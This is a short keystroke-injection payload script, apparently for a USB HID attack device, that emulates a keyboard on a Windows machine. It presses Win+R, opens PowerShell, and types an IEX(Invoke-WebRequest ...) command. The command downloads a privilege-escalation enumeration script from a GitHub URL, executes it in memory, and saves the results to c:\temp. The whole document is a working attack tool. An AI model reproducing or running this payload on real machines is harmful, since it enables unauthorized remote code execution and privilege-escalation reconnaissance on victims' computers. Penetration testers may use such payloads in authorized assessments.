/*
Invoke-Webrequest Privesc.ps1 by enjoiz (greatings)
author: Klau5t4ler0x90
*/

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Execute Invoke-Privesc.ps1 from Web over IEX
// Keep in mind the outputpath. If there is an error, try another location or stdout.
function InvokePrivesc() {
  type("IEX(Invoke-WebRequest 'https://raw.githubusercontent.com/enjoiz/Privesc/refs/heads/master/privesc.ps1'); Invoke-Privesc | Out-File c:\\temp\\result_privesc.txt");
  press("ENTER");
}

layout('de');			// DE keyboard layout
fast();

startPS();
delay(500);
InvokePrivesc();
